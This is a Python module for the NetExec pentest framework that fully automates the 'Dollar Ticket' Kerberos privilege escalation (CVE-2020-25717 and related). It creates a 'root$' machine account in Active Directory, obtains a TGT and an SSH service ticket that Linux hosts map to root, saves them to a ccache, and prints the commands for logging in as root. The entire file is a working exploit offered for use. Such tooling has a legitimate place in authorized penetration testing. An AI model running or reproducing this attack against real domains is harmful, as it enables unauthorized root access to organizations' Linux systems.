#!/usr/bin/env python3
"""
Dollar Ticket Attack Module for NetExec
Fully automates privilege escalation on Linux/Unix domain-joined systems

Author: @bl4ckarch
CVEs: CVE-2020-25717, CVE-2020-25719, CVE-2021-42287
"""

import importlib

from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.krb5 import constants

from nxc.helpers.misc import CATEGORY


class NXCModule:
    """
    Dollar Ticket Attack

    Creates machine account, obtains TGT, then requests Service Ticket for SSH.
    MIT Kerberos maps root$ to root during authentication.
    """

    name = "dollar-ticket"
    description = "Exploits Dollar Ticket Attack for privilege escalation on Linux/Unix targets credits to @bl4ckarch"
    supported_protocols = ["smb", "ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION
    multiple_hosts = False

    def options(self, context, module_options):
        r"""
        TARGET_USER     Local privileged user to impersonate (default: root)
        PASSWORD        Machine account password (default: random)
        TGT_PATH        Path to save ccache file (default: /tmp/dollar_ticket.ccache)
        SSH_TARGET      Target Linux/Unix host (REQUIRED for ST generation) FQDN

        Usage:
            nxc smb DC -u user -p pass -M dollar-ticket -o TARGET_USER=root SSH_TARGET=syrax.dracarys.lab

        Fully automated:
        1. Creates machine account (root$) via add-computer
        2. Obtains TGT for 'root' (KDC fallback to root$)
        3. Requests Service Ticket for host/target
        4. Saves complete ccache with TGT + ST
        """
        self.target_user = module_options.get("TARGET_USER", "root")
        self.password = module_options.get("PASSWORD", self._generate_password())
        self.tgt_path = module_options.get("TGT_PATH", "/tmp/dollar_ticket.ccache")
        self.ssh_target = module_options.get("SSH_TARGET")

        if not self.ssh_target:
            context.log.error("SSH_TARGET is required to generate Service Ticket")
            context.log.error("Example: -o SSH_TARGET=192.168.1.100")
            return

        if self.target_user.endswith("$"):
            self.target_user = self.target_user[:-1]

        self.computer_name = self.target_user
        self.computer_name_full = f"{self.computer_name}$"

    def on_login(self, context, connection):
        """Create machine account, obtain TGT and Service Ticket"""
        if not hasattr(self, "ssh_target"):
            return

        self.context = context
        self.connection = connection

        # Step 1: Create machine account via add-computer
        if not self._create_machine_account():
            return

        # Step 2: Generate TGT + Service Ticket
        if not self._generate_tickets():
            return

        # Step 3: Display exploitation instructions
        self._show_exploitation_steps()

    def _create_machine_account(self):
        """Create machine account using add-computer module"""
        try:
            add_computer_module = importlib.import_module("nxc.modules.add-computer")
            add_computer = add_computer_module.NXCModule()
        except Exception as e:
            self.context.log.error(f"Failed to import add-computer module: {e}")
            return False

        add_computer_options = {
            "NAME": self.computer_name,
            "PASSWORD": self.password
        }

        try:
            add_computer.options(self.context, add_computer_options)
            add_computer.on_login(self.context, self.connection)
            return True
        except SystemExit:
            self.context.log.error("Failed to create machine account")
            return False
        except Exception as e:
            self.context.log.error(f"Error creating machine account: {e}")
            return False

    def _generate_tickets(self):
        """Generate TGT and Service Ticket for SSH host"""
        self.context.log.info(f"Obtaining TGT for {self.target_user}@{self.connection.domain.upper()}")

        # Step 1: Request TGT for 'root' (without $)
        # KDC will fallback to 'root$' machine account
        userName = Principal(self.target_user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        try:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                clientName=userName,
                password=self.password,
                domain=self.connection.domain.upper(),
                lmhash=b"",
                nthash=b"",
                aesKey="",
                kdcHost=self.connection.host
            )

            self.context.log.success(f"TGT obtained (KDC fallback: {self.computer_name_full})")
            self.context.log.debug(f"Cipher: {cipher}")

        except Exception as e:
            self.context.log.fail(f"Failed to obtain TGT: {e}")
            return False

        ssh_target_fqdn = self.ssh_target
        if "." not in self.ssh_target:
            ssh_target_fqdn = f"{self.ssh_target}.{self.connection.domain}"

        self.context.log.info(f"Requesting Service Ticket for host/{ssh_target_fqdn}")

        try:
            serverName = Principal(
                f"host/{ssh_target_fqdn}",
                type=constants.PrincipalNameType.NT_SRV_INST.value
            )
            tgs, cipher_st, oldSessionKey_st, sessionKey_st = getKerberosTGS(
                serverName=serverName,
                domain=self.connection.domain.upper(),
                kdcHost=self.connection.host,
                tgt=tgt,
                cipher=cipher,
                sessionKey=sessionKey
            )
            self.context.log.success(f"Service Ticket obtained for host/{ssh_target_fqdn}")

        except Exception as e:
            self.context.log.fail(f"Failed to obtain Service Ticket: {e}")
            self.context.log.info("TGT obtained but ST failed - you can manually request ST with kinit")
            tgs = None

        try:
            ccache = CCache()
            ccache.fromTGT(tgt, oldSessionKey, sessionKey)
            if tgs:
                ccache.fromTGS(tgs, oldSessionKey_st, sessionKey_st)

            tgt_file = f"{self.tgt_path.removesuffix('.ccache')}.ccache"
            ccache.saveFile(tgt_file)

            self.context.log.success(f"Tickets saved to: {tgt_file}")
            self.tgt_file = tgt_file
            return True
        except Exception as e:
            self.context.log.fail(f"Failed to save tickets: {e}")
            return False

    def _show_exploitation_steps(self):
        """Display Dollar Ticket Attack exploitation instructions"""
        self.context.log.info("\n" + "=" * 70)
        self.context.log.info("DOLLAR TICKET ATTACK - READY FOR EXPLOITATION")
        self.context.log.info("=" * 70)
        self.context.log.info(f"Machine account: {self.computer_name_full}")
        self.context.log.info(f"Tickets saved: {self.tgt_file}")
        self.context.log.info("")
        self.context.log.info(f"Attack: Requested ticket for '{self.target_user}' (no $)")
        self.context.log.info(f"        KDC fallback issued ticket for '{self.computer_name_full}'")
        self.context.log.info(f"        SSH maps '{self.computer_name_full}' -> '{self.target_user}'")
        self.context.log.info("")
        self.context.log.info("Authenticate to Linux/Unix target:")
        self.context.log.info(f"   export KRB5CCNAME={self.tgt_file}")
        self.context.log.info(f"   ssh -o PreferredAuthentications=gssapi-with-mic -l {self.target_user} {self.ssh_target}")
        self.context.log.info("")
        self.context.log.info("Verify privilege escalation:")
        self.context.log.info("   id && whoami")
        self.context.log.info("")
        self.context.log.info("Cleanup:")
        self.context.log.info(f"  nxc {self.connection.args.protocol} {self.connection.host} -u {self.connection.username} -p <password> \\")
        self.context.log.info(f"      -M add-computer -o NAME={self.computer_name} DELETE=True")
        self.context.log.info("=" * 70 + "\n")

    @staticmethod
    def _generate_password():
        """Generate a random complex password"""
        import random
        import string

        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        password = "".join(random.choice(chars) for _ in range(16))

        if not any(c.isupper() for c in password):
            password = password[0].upper() + password[1:]
        if not any(c.islower() for c in password):
            password = password[0].lower() + password[1:]
        if not any(c.isdigit() for c in password):
            password = password[:-1] + "1"
        if not any(c in "!@#$%^&*" for c in password):
            password = password[:-1] + "!"

        return password
